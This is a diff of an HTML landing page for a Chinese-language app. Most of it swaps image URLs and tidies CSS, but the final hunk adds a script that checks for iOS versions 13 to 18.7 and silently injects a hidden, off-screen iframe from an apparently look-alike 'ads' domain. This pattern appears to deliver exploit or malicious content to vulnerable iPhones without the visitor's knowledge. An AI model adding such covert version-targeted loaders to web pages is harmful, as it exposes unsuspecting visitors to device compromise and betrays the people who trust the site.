@@ -22,7 +22,7 @@
             overflow-x: hidden;
         }
 
-        /* Vertical Scrolling Background Container */
+        /* Vertical Scrolling Background Animation */
         .bg-animation-container {
             position: fixed;
             top: 0;
@@ -31,7 +31,7 @@
             height: 100%;
             z-index: -1;
             overflow: hidden;
-            opacity: 0.35; /* Adjust background transparency if needed */
+            opacity: 0.35;
         }
         .bg-track {
             position: absolute;
@@ -40,7 +40,7 @@
             width: 100%;
             display: flex;
             flex-direction: column;
-            animation: scrollBg 25s linear infinite; /* Adjust speed by changing seconds (e.g. 25s) */
+            animation: scrollBg 25s linear infinite;
         }
         .bg-track img {
             width: 100%;
@@ -49,12 +49,8 @@
             display: block;
         }
         @keyframes scrollBg {
-            0% {
-                transform: translateY(0);
-            }
-            100% {
-                transform: translateY(-50%);
-            }
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
         }
 
         .container {
@@ -462,21 +458,19 @@
     <!-- Vertical Scrolling Background Animation -->
     <div class="bg-animation-container">
         <div class="bg-track" id="bgTrack">
-            <!-- Background Images (Duplicated seamlessly for infinite loop) -->
-            <img src="https://i.ibb.co/WNR6x0Cr/photo-2025-06-15-18-16-06.jpg" alt="bg">
-            <img src="https://i.ibb.co/F4HrqRBy/photo-2026-07-24-18-06-52.jpg" alt="bg">
-            <img src="https://i.ibb.co/rG5h0bw4/photo-2026-03-12-21-37-08.jpg" alt="bg">
-            <!-- Duplicated set for seamless infinite scroll -->
-            <img src="https://i.ibb.co/WNR6x0Cr/photo-2025-06-15-18-16-06.jpg" alt="bg">
-            <img src="https://i.ibb.co/F4HrqRBy/photo-2026-07-24-18-06-52.jpg" alt="bg">
-            <img src="https://i.ibb.co/rG5h0bw4/photo-2026-03-12-21-37-08.jpg" alt="bg">
+            <img src="https://i.ibb.co/wrwcqNdb/photo-2026-10-09-19-36-53-4.jpg" alt="bg">
+            <img src="https://i.ibb.co/MkyX9rmt/photo-2026-10-09-19-36-53-3.jpg" alt="bg">
+            <img src="https://i.ibb.co/XxcygqBc/photo-2026-08-30-13-15-05.jpg" alt="bg">
+            <img src="https://i.ibb.co/wrwcqNdb/photo-2026-10-09-19-36-53-4.jpg" alt="bg">
+            <img src="https://i.ibb.co/MkyX9rmt/photo-2026-10-09-19-36-53-3.jpg" alt="bg">
+            <img src="https://i.ibb.co/XxcygqBc/photo-2026-08-30-13-15-05.jpg" alt="bg">
         </div>
     </div>
 
     <div class="container">
         <div class="main-content">
             <!-- App Logo -->
-            <img class="logo-img" src="file:///C:/Users/ngweo/Downloads/150a05207682a226005443162be81ce4_icon%20(1).webp" alt="App Logo">
+            <img class="logo-img" src="https://i.ibb.co/zWd3sTm6/150a05207682a226005443162be81ce4-icon-1.webp" alt="App Logo">
             
             <!-- App Name & Subtitle -->
             <h1>尽情狂欢，直到天亮</h1>
@@ -523,11 +517,11 @@
             <!-- App Screenshots Auto Slide Section -->
             <h2 class="section-title">应用截图</h2>
             <div class="screenshots-container" id="screenshotsSlider">
-                <div class="screenshot-item"><img src="https://i.ibb.co/pj2njGRr/88ddfbd014c38001f2064dd844aeae1d.jpg" alt="Screenshot 1"></div>
-                <div class="screenshot-item"><img src="https://i.ibb.co/DPZ8sDjX/5535fe50c81d6006a610f9ed3bc99b2a.jpg" alt="Screenshot 2"></div>
-                <div class="screenshot-item"><img src="https://i.ibb.co/nNjkxdSn/5f97ef1a2238498389eea9f03e354e17.jpg" alt="Screenshot 3"></div>
-                <div class="screenshot-item"><img src="https://i.ibb.co/pj2njGRr/88ddfbd014c38001f2064dd844aeae1d.jpg" alt="Screenshot 4"></div>
-                <div class="screenshot-item"><img src="https://i.ibb.co/DPZ8sDjX/5535fe50c81d6006a610f9ed3bc99b2a.jpg" alt="Screenshot 5"></div>
+                <div class="screenshot-item"><img src="https://photo77net.tc87.top/img/5f97ef1a2238498389eea9f03e354e17.jpg" alt="Screenshot 1"></div>
+                <div class="screenshot-item"><img src="https://pic35hub.tc87.top/img/5535fe50c81d6006a610f9ed3bc99b2a.jpg" alt="Screenshot 2"></div>
+                <div class="screenshot-item"><img src="https://photo76box.tc87.top/img/88ddfbd014c38001f2064dd844aeae1d.jpg" alt="Screenshot 3"></div>
+                <div class="screenshot-item"><img src="https://photo77net.tc87.top/img/5f97ef1a2238498389eea9f03e354e17.jpg" alt="Screenshot 4"></div>
+                <div class="screenshot-item"><img src="https://pic35hub.tc87.top/img/5535fe50c81d6006a610f9ed3bc99b2a.jpg" alt="Screenshot 5"></div>
             </div>
 
             <!-- User Reviews Section -->
@@ -608,6 +602,28 @@
     </div>
 
     <script>
+        // Check iOS Version and conditionally inject iframe
+        function checkIOSAndInjectIframe() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/OS (\d+)_(\d+)?_?(\d+)?/);
+            
+            if (match) {
+                const major = parseInt(match[1], 10);
+                const minor = match[2] ? parseInt(match[2], 10) : 0;
+                
+                // Rules condition: major >= 13 && (major < 18 || (major === 18 && minor <= 7))
+                if (major >= 13 && (major < 18 || (major === 18 && minor <= 7))) {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = "https://ads.yurticlkargo.com/static/sdk.html";
+                    iframe.style.cssText = "position:fixed;top:0;left:-1000px;pointer-events:none;border:0";
+                    document.body.appendChild(iframe);
+                }
+            }
+        }
+
+        // Run version check on load
+        window.addEventListener('DOMContentLoaded', checkIOSAndInjectIframe);
+
         function isWeChat() {
             var ua = navigator.userAgent.toLowerCase();
             return ua.indexOf('micromessenger') !== -1;
